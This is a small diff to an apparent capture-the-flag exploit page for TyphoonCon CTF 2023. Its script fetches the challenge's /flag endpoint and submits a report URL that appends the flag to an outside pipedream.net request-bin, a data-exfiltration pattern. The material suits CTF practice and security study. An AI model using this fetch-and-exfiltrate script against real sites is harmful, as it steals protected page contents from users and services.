@@ -7,19 +7,15 @@
 <body>
   
 <script>
-  const w = window.open('https://typhoonconctf-2023-half-of-fake.chals.io/flag');
-  setTimeout(() => {
-    data = w.document.documentElement.innerHTML
+  fetch("https://typhoonconctf-2023-half-of-fake.chals.io/flag").then(data => data.text()).then((data) => {
     fetch("https://typhoonconctf-2023-half-of-fake.chals.io/report", {
       body: "url=https://enbit6i3l2ra4.x.pipedream.net/" + data,
       headers: {
         "Content-Type": "application/x-www-form-urlencoded"
       },
       method: "POST"
-    })
-
-  }, 200);
-  
+    });
+  });
 
 </script>
 
